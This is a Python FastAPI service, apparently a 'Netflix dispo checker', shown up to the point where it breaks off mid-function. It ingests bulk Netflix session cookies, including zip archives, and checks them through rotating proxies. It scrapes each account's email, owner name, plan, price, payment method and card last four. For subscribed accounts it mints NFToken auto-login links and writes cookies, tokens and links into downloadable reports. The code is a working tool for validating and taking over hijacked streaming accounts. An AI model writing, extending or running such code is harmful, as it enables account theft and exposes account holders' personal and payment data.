"""Netflix dispo checker: cookie files in, plans sorted by tier with NFToken out."""

from __future__ import annotations

import asyncio
import html
import io
import json
import os
import random
import re
import threading
import time
import unicodedata
import uuid
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

import requests
import urllib3
from requests.adapters import HTTPAdapter
from fastapi import Depends, FastAPI, File, Form, Header, HTTPException, Request, UploadFile
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, Field

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_DIR = Path(__file__).resolve().parent
INDEX = (BASE_DIR / "templates" / "index.html").read_text(encoding="utf-8")

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)
MEMBERSHIP_URL = "https://www.netflix.com/account/membership"
NFTOKEN_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
RETRY_STATUS = {403, 429, 500, 502, 503, 504}
COOKIE_NAMES = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
DEVICES = ("pc", "mobile", "tv")
MAX_FILE_BYTES = 4_000_000
MAX_FILES = 200
MAX_ZIP_BYTES = 40_000_000
MAX_PAGE_BYTES = 900_000
ZIP_SUFFIXES = (".txt", ".json", ".csv")

STATE_DIR = Path(os.getenv("STATE_DIR", "/tmp/netflix-dispo-checker"))
SNAPSHOT_INTERVAL = 2.0

LINK_TEMPLATES = {
    "pc": "https://netflix.com/?nftoken={token}",
    "mobile": "https://netflix.com/unsupported?nftoken={token}",
    "tv": "https://netflix.com/tv2?nftoken={token}",
}

NFTOKEN_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","roarEnabled":"false","useCDSGalleryEnabled":"true","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.client.type": "argo",
    "x-netflix.context.locales": "en-US",
    "accept-language": "en-US;q=1",
    "x-netflix.context.ui-flavor": "argo",
}

PLAN_LABELS = {
    "premium": "Premium",
    "standard": "Standard",
    "standard_with_ads": "Standard With Ads",
    "basic": "Basic",
    "mobile": "Mobile",
    "free": "Free",
    "unknown": "Unknown",
    "invalid": "Invalid",
    "error": "Error",
}
PLAN_RANK = {
    "premium": 90,
    "standard": 80,
    "standard_with_ads": 70,
    "basic": 60,
    "mobile": 50,
    "unknown": 40,
    "free": 30,
    "invalid": 20,
    "error": 10,
}
PLAN_ALIASES = {
    "premium": {"premium", "premium_plan", "premium_extra_member", "cao_cap", "ozel", "高級", "高级"},
    "standard_with_ads": {
        "standard_with_ads",
        "standardwithads",
        "standard_avec_pub",
        "estandar_con_anuncios",
        "padrao_com_anuncios",
        "basic_with_ads",
        "附广告标准",
    },
    "standard": {"standard", "estandar", "padrao", "standart", "standardowy", "标准", "標準"},
    "basic": {"basic", "basico", "basique", "essentiel", "base", "dasar", "基本"},
    "mobile": {"mobile", "ponsel", "seluler", "movil", "モバイル"},
}
EXTRA_MARKERS = ("extra member", "miembro extra", "suscriptor extra", "membro extra", "assinante extra", "额外成员")
HOLD_MARKERS = ("hold", "past_due", "payment_retry", "paused", "suspend", "delinquent")


# ---------------------------------------------------------------- settings


def _env_int(name: str, default: int, low: int, high: int) -> int:
    try:
        return max(low, min(high, int(os.getenv(name, default))))
    except (TypeError, ValueError):
        return default


def _parse_proxy(line: str) -> dict | None:
    value = re.sub(r"^([a-z][a-z0-9+.-]*):/+", r"\1://", line.strip(), flags=re.I)
    if not value or value.startswith("#"):
        return None
    match = re.match(
        r"^(?:(?P<scheme>https?|socks5h?|socks4a?)://)?"
        r"(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?"
        r"(?P<host>[^:\s@]+):(?P<port>\d+)"
        r"(?:@(?P<user2>[^:@\s]+):(?P<password2>\S+))?$",
        value,
        flags=re.I,
    )
    if not match:
        return None
    data = match.groupdict()
    scheme = (data["scheme"] or "http").lower()
    user = data["user"] or data["user2"]
    password = data["password"] or data["password2"]
    auth = f"{user}:{password}@" if user and password else ""
    url = f"{scheme}://{auth}{data['host']}:{data['port']}"
    return {"http": url, "https": url}


def parse_proxy_text(text: str | None) -> list[dict]:
    pool: list[dict] = []
    for chunk in (text or "").replace("\r", "\n").split("\n"):
        for line in chunk.split(","):
            parsed = _parse_proxy(line)
            if parsed:
                pool.append(parsed)
    return pool


@dataclass(frozen=True)
class Settings:
    token: str | None
    proxies: tuple[dict, ...]
    concurrency: int
    max_concurrency: int
    max_cookies: int
    max_jobs: int
    ttl: int
    timeout: float
    retries: int
    token_attempts: int
    nftoken: bool


SETTINGS = Settings(
    token=(os.getenv("ACCESS_TOKEN") or "").strip() or None,
    proxies=tuple(parse_proxy_text(os.getenv("PROXY_LIST"))),
    concurrency=_env_int("DEFAULT_CONCURRENCY", 8, 1, 64),
    max_concurrency=_env_int("MAX_CONCURRENCY", 32, 1, 128),
    max_cookies=_env_int("MAX_COOKIES_PER_JOB", 250, 1, 5000),
    max_jobs=_env_int("MAX_ACTIVE_JOBS", 8, 1, 64),
    ttl=_env_int("JOB_TTL_SECONDS", 3600, 300, 86400),
    timeout=float(_env_int("REQUEST_TIMEOUT_SECONDS", 12, 3, 120)),
    retries=_env_int("CHECK_RETRIES", 2, 1, 10),
    token_attempts=_env_int("NFTOKEN_ATTEMPTS", 3, 1, 10),
    nftoken=(os.getenv("NFTOKEN_ENABLED", "true").lower() not in {"0", "false", "no", "off"}),
)


_TLS = threading.local()


def http_session(name: str = "main") -> requests.Session:
    """Keep-alive session per thread and per purpose, so sockets are reused."""
    session = getattr(_TLS, name, None)
    if session is None:
        session = requests.Session()
        adapter = HTTPAdapter(pool_connections=4, pool_maxsize=max(8, SETTINGS.max_concurrency))
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        _TLS.__setattr__(name, session)
    return session


# ----------------------------------------------------------------- cookies

_CANON = {name.lower(): name for name in COOKIE_NAMES}
_RAW_PATTERN = re.compile(
    r"(?P<name>" + "|".join(COOKIE_NAMES) + r")\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)", re.I
)


def canonical(name: str | None) -> str:
    raw = str(name or "").strip()
    return _CANON.get(raw.lower(), raw)


def parse_cookies(text: str) -> list[dict[str, str]]:
    """One cookie dict per account found in the text."""
    if not text or not text.strip():
        return []
    pairs: list[tuple[str, str]] = []
    try:
        payload = json.loads(text)
        if isinstance(payload, dict):
            payload = payload.get("cookies") or payload.get("items") or [payload]
        if isinstance(payload, list):
            pairs = [(item.get("name"), item.get("value")) for item in payload if isinstance(item, dict)]
    except ValueError:
        pass
    if not pairs:
        for line in text.splitlines():
            parts = line.strip().split("\t")
            if len(parts) >= 7 and parts[1].upper() in ("TRUE", "FALSE"):
                pairs.append((parts[5], "\t".join(parts[6:])))
        if not pairs:
            pairs = [
                (match.group("name"), match.group("value").strip("'\"").rstrip(","))
                for match in _RAW_PATTERN.finditer(text)
            ]
    by_name: dict[str, list[str]] = {}
    for name, value in pairs:
        name = canonical(name)
        if name in COOKIE_NAMES and value:
            by_name.setdefault(name, []).append(value)
    bundles: list[dict[str, str]] = []
    seen: set[str] = set()
    for index in range(len(by_name.get("NetflixId", []))):
        cookies = {}
        for name, values in by_name.items():
            if index < len(values):
                cookies[name] = values[index]
            elif len(values) == 1:
                cookies[name] = values[0]
        netflix_id = cookies.get("NetflixId")
        if netflix_id and netflix_id not in seen:
            seen.add(netflix_id)
            bundles.append(cookies)
    return bundles


def merge_accounts(texts: list[str]) -> list[dict[str, str]]:
    seen: set[str] = set()
    accounts: list[dict[str, str]] = []
    for text in texts:
        for cookies in parse_cookies(text):
            netflix_id = cookies.get("NetflixId", "")
            if netflix_id and netflix_id not in seen:
                seen.add(netflix_id)
                accounts.append(cookies)
    return accounts


def collect(texts: list[str], sources: list[str]) -> tuple[list[dict[str, str]], list[str]]:
    """Accounts plus their sources, deduplicated and kept aligned."""
    seen: set[str] = set()
    accounts: list[dict[str, str]] = []
    kept: list[str] = []
    for position, text in enumerate(texts):
        source = sources[position] if position < len(sources) else "input"
        for cookies in parse_cookies(text):
            netflix_id = cookies.get("NetflixId", "")
            if not netflix_id or netflix_id in seen:
                continue
            seen.add(netflix_id)
            accounts.append(cookies)
            kept.append(source)
    return accounts, kept


def expand_zip(data: bytes, texts: list[str], sources: list[str], budget: int) -> tuple[int, int]:
    """Extract readable cookie entries from an in-memory zip. Returns (skipped, budget)."""
    try:
        archive = zipfile.ZipFile(io.BytesIO(data))
    except (zipfile.BadZipFile, OSError):
        return 1, budget

    skipped = 0
    with archive:
        for info in archive.infolist():
            if info.is_dir():
                continue
            if not info.filename.lower().endswith(ZIP_SUFFIXES):
                skipped += 1
                continue
            if budget <= 0:
                skipped += 1
                continue
            try:
                raw = archive.read(info)[:budget]
            except (zipfile.BadZipFile, RuntimeError, OSError):
                skipped += 1
                continue
            budget -= len(raw)
            text = decode_file(raw)
            if not parse_cookies(text):
                skipped += 1
                continue
            texts.append(text)
            sources.append(info.filename)
    return skipped, budget


def decode_file(data: bytes) -> str:
    for encoding in ("utf-8", "utf-8-sig", "latin-1"):
        try:
            return data.decode(encoding)
        except UnicodeDecodeError:
            continue
    return data.decode("utf-8", errors="ignore")


def to_netscape(cookies: dict[str, str]) -> str:
    return "\n".join(f".netflix.com\tTRUE\t/\tTRUE\t0\t{name}\t{value}" for name, value in cookies.items())


# ------------------------------------------------------------------- plans


def normalize(value: str | None) -> str:
    if not value:
        return ""
    simplified = unicodedata.normalize("NFKD", str(value))
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    return re.sub(r"[^\w]+", "_", simplified.lower()).strip("_")


def is_extra_member(info: dict) -> bool:
    for haystack in (info.get("plan_name") or "", info.get("membership_status") or ""):
        if any(marker in haystack.lower() for marker in EXTRA_MARKERS):
            return True
        if any(marker in normalize(haystack) for marker in ("extra_member", "miembro_extra")):
            return True
    return False


def is_on_hold(info: dict) -> bool:
    hold = str(info.get("hold") or "").strip().lower()
    if hold in {"yes", "true"}:
        return True
    if hold in {"no", "false"}:
        return False
    return any(marker in normalize(info.get("membership_status")) for marker in HOLD_MARKERS)


def is_subscribed(info: dict) -> bool:
    return normalize(info.get("membership_status")) == "current_member" or is_extra_member(info)


def derive_plan(info: dict, subscribed: bool) -> tuple[str, str]:
    name = info.get("plan_name") or ""
    key = normalize(name)
    quality = normalize(info.get("quality"))
    streams = int(re.sub(r"\D", "", str(info.get("streams") or "0")) or 0)
    for plan, aliases in PLAN_ALIASES.items():
        if key in aliases:
            return plan, PLAN_LABELS[plan]
    if is_extra_member(info):
        return "premium", "Premium (Extra Member)"
    if streams:
        if streams >= 4 or quality in {"uhd", "ultra_hd", "4k"}:
            return "premium", PLAN_LABELS["premium"]
        if streams >= 2 or quality in {"hd", "full_hd"}:
            return "standard", PLAN_LABELS["standard"]
        if key in PLAN_ALIASES["mobile"]:
            return "mobile", PLAN_LABELS["mobile"]
        return "basic", PLAN_LABELS["basic"]
    if name:
        return key or "unknown", name
    return ("unknown", PLAN_LABELS["unknown"]) if subscribed else ("free", PLAN_LABELS["free"])


def sort_key(result: dict) -> tuple:
    return (
        -PLAN_RANK.get(result.get("plan") or "error", 0),
        0 if result.get("status") == "valid" else 1,
        result.get("country") or "ZZ",
        result.get("index", 0),
    )


# ----------------------------------------------------------------- netflix


def _clean(value: Any) -> str | None:
    if value is None:
        return None
    text = html.unescape(str(value))
    text = text.replace("\\u00A0", " ").replace("\\/", "/").replace('\\"', '"')
    text = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), text)
    text = re.sub(r"\s+", " ", text).strip()
    return text or None


FIELD_PATTERNS = {
    "country": (r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup"\s*:\s*"([^"]+)"'),
    "membership_status": (r'"membershipStatus"\s*:\s*"([^"]+)"',),
    "plan_name": (
        r'"localizedPlanName"\s*:\s*"([^"]+)"',
        r'"planName"\s*:\s*"([^"]+)"',
        r'"currentPlan"\s*:\s*\{[\s\S]{0,400}?"name"\s*:\s*"([^"]+)"',
    ),
    "quality": (r'"videoQuality"\s*:\s*"([^"]+)"',),
    "streams": (r'"maxStreams"\s*:\s*"?(\d+)"?',),
    "hold": (r'"isUserOnHold"\s*:\s*(true|false)', r'"holdStatus"\s*:\s*"([^"]+)"'),
    "name": (r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"firstName"\s*:\s*"([^"]+)"'),
    "email": (r'"emailAddress"\s*:\s*"([^"]+)"', r'"loginId"\s*:\s*"([^"]+)"'),
    "next_billing": (r'"nextBillingDate"\s*:\s*"([^"]+)"',),
    "member_since": (r'"memberSince"\s*:\s*"([^"]+)"',),
    "price": (r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"displayPrice"\s*:\s*"([^"]+)"'),
    "payment": (r'"paymentMethod"\s*:\s*"([^"]+)"', r'"paymentType"\s*:\s*"([^"]+)"'),
    "card": (r'"lastFour"\s*:\s*"([^"]+)"',),
}
COMPILED = {key: tuple(re.compile(pattern, re.I) for pattern in value) for key, value in FIELD_PATTERNS.items()}
PROFILE_PATTERN = re.compile(r'"profileName"\s*:\s*"([^"]+)"')


def _first(key: str, page: str) -> str | None:
    for pattern in COMPILED[key]:
        match = pattern.search(page)
        if match:
            value = _clean(match.group(1))
            if value:
                return value
    return None


def extract_info(page: str) -> dict:
    info = {key: _first(key, page) for key in COMPILED}
    info["profiles"] = [value for value in PROFILE_PATTERN.findall(page) if value]
    return {key: value for key, value in info.items() if value not in (None, "", [])}


@dataclass
class Outcome:
    status: str
    info: dict = field(default_factory=dict)
    error: str | None = None


REDIRECT_STATUS = {301, 302, 303, 307, 308}
LOGIN_MARKERS = ('"loginForm"', 'id="login-form"', "/login", "signIn")
MAX_HOPS = 3


def _resolve(session: requests.Session, headers: dict, proxy: dict | None):
    """Follow redirects by hand so a /login bounce stays visible."""
    url = MEMBERSHIP_URL
    response = None
    for _ in range(MAX_HOPS):
        response = session.get(
            url,
            headers=headers,
            proxies=proxy,
            timeout=(SETTINGS.timeout / 2, SETTINGS.timeout),
            allow_redirects=False,
        )
        if response.status_code not in REDIRECT_STATUS:
            return response, False
        location = response.headers.get("Location") or ""
        if "/login" in location:
            return response, True
        url = urljoin(url, location)
    return response, False


def check_account(cookies: dict[str, str], pool: list[dict]) -> Outcome:
    headers = {"User-Agent": UA, "Accept": "text/html,*/*;q=0.8", "Accept-Encoding": "gzip, deflate"}
    last_error = "network error"

    for attempt in range(SETTINGS.retries):
        proxy = pool[attempt % len(pool)] if pool else None
        session = http_session()
        session.cookies.clear()
        session.cookies.update(cookies)
        try:
            response, bounced = _resolve(session, headers, proxy)
            status = response.status_code

            if bounced:
                return Outcome("invalid", error="cookie expired (login redirect)")

            if status in {401, 404}:
                return Outcome("invalid", error=f"HTTP {status}")

            if status in RETRY_STATUS:
                last_error = f"HTTP {status}"
                if attempt < SETTINGS.retries - 1:
                    continue
                return Outcome("error", error=last_error)

            if status != 200:
                return Outcome("error", error=f"HTTP {status}")

            page = (response.text or "")[:MAX_PAGE_BYTES]
            info = extract_info(page)
            if not info.get("country") and not info.get("membership_status") and not info.get("plan_name"):
                if any(marker in page for marker in LOGIN_MARKERS):
                    return Outcome("invalid", error="cookie expired (login page)")
                last_error = "incomplete account page"
                if attempt < SETTINGS.retries - 1:
                    continue
                return Outcome("error", error=last_error)

            return Outcome("ok", info=info)
        except requests.exceptions.Timeout:
            last_error = "timeout"
        except requests.exceptions.ProxyError:
            last_error = "proxy error"
        except requests.exceptions.RequestException as exc:
            last_error = type(exc).__name__

    return Outcome("error", error=last_error)


def create_nftoken(netflix_id: str, proxy: dict | None) -> tuple[str | None, str | None]:
    """(token, expiry) or (None, error)."""
    if not netflix_id:
        return None, "missing NetflixId"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    last_error = "nftoken api error"
    for _ in range(SETTINGS.token_attempts):
        try:
            response = http_session("token").get(
                NFTOKEN_URL,
                params=NFTOKEN_PARAMS,
                headers=headers,
                proxies=proxy,
                timeout=(SETTINGS.timeout / 2, SETTINGS.timeout),
                verify=False,
            )
            if response.status_code != 200:
                last_error = f"HTTP {response.status_code}"
                continue
            node = ((((response.json().get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
            token = _clean(node.get("token"))
            if not token:
                last_error = "token missing in response"
                continue
            expiry = None
            try:
                stamp = int(node.get("expires") or 0)
                stamp = stamp // 1000 if len(str(abs(stamp))) == 13 else stamp
                expiry = datetime.fromtimestamp(stamp, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
            except (TypeError, ValueError, OSError, OverflowError):
                expiry = None
            return token, expiry
        except requests.exceptions.RequestException as exc:
            last_error = type(exc).__name__
        except ValueError:
            last_error = "invalid json response"
    return None, last_error


def build_links(token: str, devices: list[str]) -> list[dict]:
    return [{"device": d, "url": LINK_TEMPLATES[d].format(token=token)} for d in devices if d in LINK_TEMPLATES]


def pick_devices(raw: list[str] | None) -> list[str]:
    wanted = {str(item).strip().lower() for item in (raw or [])}
    if "all" in wanted:
        return list(DEVICES)
    return [device for device in DEVICES if device in wanted]


# -------------------------------------------------------------------- jobs


@dataclass
class Job:
    id: str
    devices: list[str]
    concurrency: int
    proxies: list[dict]
    accounts: list[dict[str, str]]
    sources: list[str]
    created_at: float = field(default_factory=time.time)
    status: str = "queued"
    done: int = 0
    results: list[dict[str, Any]] = field(default_factory=list)
    cancelled: bool = False
    started_at: float | None = None
    finished_at: float | None = None
    lock: threading.Lock = field(default_factory=threading.Lock)

    @property
    def total(self) -> int:
        return len(self.accounts)

    def counters(self) -> dict[str, int]:
        counts = {"valid": 0, "free": 0, "invalid": 0, "error": 0}
        for result in self.results:
            if result["status"] in counts:
                counts[result["status"]] += 1
        return counts

    def finish_item(self, result: dict[str, Any]) -> None:
        with self.lock:
            self.results.append(result)
            self.done += 1
            if self.done >= self.total:
                self.status = "cancelled" if self.cancelled else "done"
                self.finished_at = time.time()
        save_snapshot(self, force=self.done >= self.total)

    def public(self, with_cookies: bool = False, limit: int | None = None) -> dict[str, Any]:
        with self.lock:
            results = sorted(self.results, key=sort_key)
        matched = len(results)
        if limit is not None and limit > 0:
            results = results[:limit]
        keys = (
            "index", "status", "plan", "plan_label", "country", "email", "name", "streams",
            "quality", "price", "profiles", "extra_member", "on_hold", "nftoken",
            "nftoken_expires", "links", "error", "source",
        )
        payload = {
            "id": self.id,
            "status": self.status,
            "total": self.total,
            "done": self.done,
            "matched": matched,
            "shown": len(results),
            "sources": self.sources,
            "counters": self.counters(),
            "results": [{key: result.get(key) for key in keys} for result in results],
        }
        if with_cookies:
            for public, result in zip(payload["results"], results):
                public["cookies"] = result.get("cookies")
        return payload


JOBS: dict[str, Job] = {}
JOBS_LOCK = threading.Lock()
HITS: dict[str, list[float]] = {}
_LAST_SAVE: dict[str, float] = {}

try:
    STATE_DIR.mkdir(parents=True, exist_ok=True)
except OSError:
    pass


def _snapshot_path(job_id: str) -> Path:
    return STATE_DIR / f"{job_id}.json"


def save_snapshot(job: Job, force: bool = False) -> None:
    """Write the job to disk so a restart does not erase it."""
    now = time.time()
    if not force and now - _LAST_SAVE.get(job.id, 0.0) < SNAPSHOT_INTERVAL:
        return
    _LAST_SAVE[job.id] = now
    payload = job.public(with_cookies=True)
    payload["saved_at"] = now
    target = _snapshot_path(job.id)
    scratch = target.with_suffix(f".{os.getpid()}.{threading.get_ident()}.tmp")
    try:
        scratch.write_text(json.dumps(payload), encoding="utf-8")
        scratch.replace(target)
    except (OSError, TypeError, ValueError):
        pass


def load_snapshot(job_id: str) -> dict | None:
    try:
        raw = _snapshot_path(job_id).read_text(encoding="utf-8")
    except OSError:
        return None
    try:
        return json.loads(raw)
    except ValueError:
        return None


def drop_snapshot(job_id: str) -> None:
    _LAST_SAVE.pop(job_id, None)
    try:
        _snapshot_path(job_id).unlink()
    except OSError:
        pass


def _purge() -> None:
    limit = time.time() - SETTINGS.ttl
    with JOBS_LOCK:
        for job_id, job in list(JOBS.items()):
            if job.status in {"done", "cancelled"} and (job.finished_at or job.created_at) < limit:
                JOBS.pop(job_id, None)
                drop_snapshot(job_id)
        if STATE_DIR.is_dir():
            for stale in STATE_DIR.glob("*.json"):
                try:
                    if stale.stat().st_mtime < limit:
                        stale.unlink()
                        _LAST_SAVE.pop(stale.stem, None)
                except OSError:
                    continue


def _active() -> int:
    with JOBS_LOCK:
        return sum(1 for job in JOBS.values() if job.status in {"queued", "running"})


def _process(job: Job, index: int) -> None:
    if job.cancelled:
        return
    cookies = job.accounts[index]
    pool = job.proxies or list(SETTINGS.proxies)
    result: dict[str, Any] = {
        "index": index,
        "source": job.sources[index] if index < len(job.sources) else None,
        "status": "error",
        "plan": "error",
        "plan_label": "Error",
        "profiles": [],
        "extra_member": False,
        "on_hold": False,
        "links": [],
        "cookies": to_netscape(cookies),
    }
    try:
        outcome = check_account(cookies, pool)
        if outcome.status != "ok":
            result.update(status=outcome.status, plan=outcome.status, error=outcome.error)
            result["plan_label"] = "Invalid" if outcome.status == "invalid" else "Error"
            return
        info = outcome.info
        subscribed = is_subscribed(info)
        plan, label = derive_plan(info, subscribed)
        extra = is_extra_member(info)
        result.update(
            status="valid" if subscribed else "free",
            plan="free" if not subscribed else plan,
            plan_label="Free" if not subscribed else ("Premium (Extra Member)" if extra else label),
            country=info.get("country"),
            email=info.get("email"),
            name=info.get("name"),
            streams=info.get("streams"),
            quality=info.get("quality"),
            price=info.get("price"),
            profiles=info.get("profiles") or [],
            extra_member=extra,
            on_hold=is_on_hold(info),
        )
        if subscribed and job.devices:
            token, expiry = create_nftoken(cookies.get("NetflixId", ""), pool[random.randrange(len(pool))] if pool else None)
            if token:
                result.update(nftoken=token, nftoken_expires=expiry, links=build_links(token, job.devices))
            else:
                result["error"] = f"nftoken: {expiry}"
    except Exception as exc:  # noqa: BLE001
        result.update(status="error", plan="error", plan_label="Error", error=f"{type(exc).__name__}: {exc}")
    finally:
        job.finish_item(result)


def _run(job: Job) -> None:
    job.status = "running"
    job.started_at = time.time()
    try:
        with ThreadPoolExecutor(max_workers=max(1, min(job.concurrency, job.total))) as pool:
            for future in as_completed([pool.submit(_process, job, index) for index in range(job.total)]):
                future.result()
    finally:
        if job.status in {"queued", "running"}:
            job.status = "cancelled" if job.cancelled else "done"
        job.finished_at = job.finished_at or time.time()
        save_snapshot(job, force=True)


def start_job(accounts: list[dict[str, str]], sources: list[str], devices: list[str], concurrency: int, proxies: list[dict]) -> Job:
    job = Job(
        id=uuid.uuid4().hex[:12],
        devices=devices,
        concurrency=concurrency,
        proxies=proxies,
        accounts=accounts,
        sources=sources,
    )
    with JOBS_LOCK:
        JOBS[job.id] = job
    threading.Thread(target=_run, args=(job,), daemon=True, name=f"job-{job.id}").start()
    return job


def build_report(job: Job) -> str:
    payload = job.public(with_cookies=True)
    counts = payload["counters"]
    lines = [
        f"Netflix check report - job {job.id}",
        f"Status: {payload['status']} | Total: {payload['total']} | Valid: {counts['valid']} | "
        f"Free: {counts['free']} | Invalid: {counts['invalid']} | Errors: {counts['error']}",
        "",
    ]
    for position, result in enumerate(payload["results"], start=1):
        lines += ["=" * 78, f"[{position}] {result['plan_label'].upper()} | {result.get('country') or '-'}"]
        if result.get("source"):
            lines.append(f"Source: {result['source']}")
        for key, label in (("email", "Email"), ("streams", "Streams"), ("quality", "Quality"), ("price", "Price")):
            if result.get(key):
                lines.append(f"{label}: {result[key]}")
        if result.get("profiles"):
            lines.append(f"Profiles: {', '.join(result['profiles'])}")
        if result.get("on_hold"):
            lines.append("On hold: Yes")
        if result.get("error"):
            lines.append(f"Note: {result['error']}")
        if result.get("nftoken"):
            lines.append(f"NFToken: {result['nftoken']}")
            if result.get("nftoken_expires"):
                lines.append(f"Valid till: {result['nftoken_expires']}")
            for link in result.get("links") or []:
                lines.append(f"{link['device'].upper()}: {link['url']}")
        lines += ["", "Cookie:", result.get("cookies") or "", ""]
    return "\n".join(lines)


# -------------------------------------------------------------------- http

app = FastAPI(title="Netflix Dispo Checker", docs_url="/api/docs", openapi_url="/api/openapi.json")
app.mount("/static", StaticFiles(directory=str(BASE_DIR / "static")), name="static")


def require_token(x_access_token: str | None = Header(default=None)) -> None:
    if SETTINGS.token and x_access_token != SETTINGS.token:
        raise HTTPException(status_code=401, detail="Invalid or missing access token")


class JobRequest(BaseModel):
    cookies: str = Field(min_length=1, max_length=4_000_000)
    devices: list[str] = Field(default_factory=lambda: ["pc"])
    concurrency: int | None = None
    proxies: str | None = None


def _enqueue(
    request: Request,
    accounts: list[dict[str, str]],
    sources: list[str],
    devices_raw: list[str],
    concurrency: int | None,
    proxies_text: str | None,
    skipped: int = 0,
) -> JSONResponse:
    _purge()
    if _active() >= SETTINGS.max_jobs:
        raise HTTPException(status_code=429, detail="Too many jobs running, retry shortly")

    client = request.client.host if request.client else "unknown"
    now = time.time()
    recent = [stamp for stamp in HITS.get(client, []) if now - stamp < 60]
    if len(recent) >= 20:
        raise HTTPException(status_code=429, detail="Rate limit: 20 jobs per minute")
    HITS[client] = recent + [now]

    if not accounts:
        raise HTTPException(status_code=422, detail="No Netflix cookie found in the input")

    skipped += max(0, len(accounts) - SETTINGS.max_cookies)
    accounts = accounts[: SETTINGS.max_cookies]
    sources = sources[: len(accounts)]
    concurrency = max(1, min(concurrency or SETTINGS.concurrency, SETTINGS.max_concurrency, len(accounts)))
    devices = pick_devices(devices_raw) if SETTINGS.nftoken else []

    job = start_job(accounts, sources, devices, concurrency, parse_proxy_text(proxies_text))
    return JSONResponse(
        {"job_id": job.id, "total": job.total, "skipped": skipped, "devices": devices, "concurrency": concurrency},
        status_code=202,
    )


@app.get("/", response_class=HTMLResponse)
async def index() -> HTMLResponse:
    return HTMLResponse(INDEX)


@app.get("/healthz")
async def healthz() -> dict:
    return {"status": "ok"}


@app.get("/api/config")
async def config() -> dict:
    return {
        "auth_required": bool(SETTINGS.token),
        "devices": list(DEVICES),
        "plans": [{"key": key, "label": label, "rank": PLAN_RANK[key]} for key, label in PLAN_LABELS.items()],
        "default_concurrency": SETTINGS.concurrency,
        "max_concurrency": SETTINGS.max_concurrency,
        "max_files": MAX_FILES,
        "server_proxies": len(SETTINGS.proxies),
        "nftoken_enabled": SETTINGS.nftoken,
    }


@app.post("/api/jobs", dependencies=[Depends(require_token)])
async def create_job(payload: JobRequest, request: Request) -> JSONResponse:
    accounts = parse_cookies(payload.cookies)
    return _enqueue(request, accounts, ["paste"] * len(accounts), payload.devices, payload.concurrency, payload.proxies)


@app.post("/api/jobs/files", dependencies=[Depends(require_token)])
async def create_job_files(
    request: Request,
    files: list[UploadFile] | None = File(default=None),
    cookies: str | None = Form(default=None),
    devices: str = Form(default="pc"),
    concurrency: int | None = Form(default=None),
    proxies: str | None = Form(default=None),
) -> JSONResponse:
    uploads = list(files or [])
    if not uploads and not (cookies or "").strip():
        raise HTTPException(status_code=422, detail="Attach at least one cookie file")

    texts: list[str] = []
    sources: list[str] = []
    skipped = 0
    budget = MAX_ZIP_BYTES

    for upload in uploads[:MAX_FILES]:
        name = upload.filename or "file"
        data = await upload.read(MAX_FILE_BYTES)
        if not data:
            skipped += 1
            continue
        if name.lower().endswith(".zip") or data[:2] == b"PK":
            extra, budget = expand_zip(data, texts, sources, budget)
            skipped += extra
            continue
        text = decode_file(data)
        if not parse_cookies(text):
            skipped += 1
            continue
        texts.append(text)
        sources.append(name)
    skipped += max(0, len(uploads) - MAX_FILES)

    if (cookies or "").strip():
        texts.append(cookies or "")
        sources.append("paste")

    accounts, kept = collect(texts, sources)
    return _enqueue(
        request,
        accounts,
        kept,
        [item for item in devices.split(",") if item.strip()],
        concurrency,
        proxies,
        skipped,
    )


@app.get("/api/jobs/{job_id}", dependencies=[Depends(require_token)])
async def read_job(job_id: str, limit: int = 300) -> dict:
    job = JOBS.get(job_id)
    if job is not None:
        return job.public(with_cookies=True, limit=limit)

    snapshot = load_snapshot(job_id)
    if snapshot is None:
        raise HTTPException(status_code=404, detail="Job not found")

    results = snapshot.get("results") or []
    if limit > 0:
        results = results[:limit]
    snapshot["results"] = results
    snapshot["shown"] = len(results)
    snapshot["recovered"] = True
    if snapshot.get("status") in {"queued", "running"}:
        snapshot["status"] = "lost"
    return snapshot


@app.get("/api/jobs/{job_id}/report.txt", dependencies=[Depends(require_token)], response_class=PlainTextResponse)
async def report_txt(job_id: str) -> PlainTextResponse:
    job = JOBS.get(job_id)
    if job is None:
        raise HTTPException(status_code=404, detail="Job not found")
